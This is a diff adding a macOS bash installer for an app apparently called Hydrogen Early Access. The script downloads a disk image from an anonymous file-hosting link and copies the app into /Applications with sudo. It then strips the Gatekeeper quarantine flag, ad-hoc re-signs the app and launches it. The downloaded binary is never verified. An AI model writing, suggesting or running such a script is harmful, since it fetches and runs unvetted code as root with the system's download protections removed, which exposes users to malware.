@@ -1,0 +1,43 @@
+#!/bin/bash
+
+URL="https://files.catbox.moe/etd6fc.dmg"
+DMG="App.dmg"
+DEST="/Applications/App.app"
+
+if [ -d "$DEST" ]; then
+    echo "[!] App is already installed at /Applications."
+    open "$DEST"
+    exit 0
+fi
+
+echo "[*] Downloading $DMG..."
+curl -L -o "$DMG" "$URL"
+
+echo "[*] Mounting $DMG..."
+hdiutil mount "$DMG"
+
+SOURCE="/Volumes/App/App.app"
+
+[ ! -d "$SOURCE" ] && echo "[!] App not found." && exit 1
+
+echo "[*] Copying App to /Applications..."
+sudo cp -R "$SOURCE" "$DEST"
+
+echo "[*] Unmounting the disk image..."
+hdiutil unmount "/Volumes/App"
+
+echo "[*] Removing quarantine flag..."
+sudo xattr -rd com.apple.quarantine "$DEST"
+
+echo "[*] Performing ad-hoc code signing..."
+sudo codesign --deep --force --verify --verbose --sign - "$DEST"
+
+echo "[*] Verifying signature..."
+sudo codesign --verify --deep --strict --verbose=2 "$DEST"
+
+echo "[✓] Installed and signed App successfully!"
+
+echo "[*] Opening App..."
+open "$DEST"
+
+echo "Enjoy Hydrogen Early Access!"
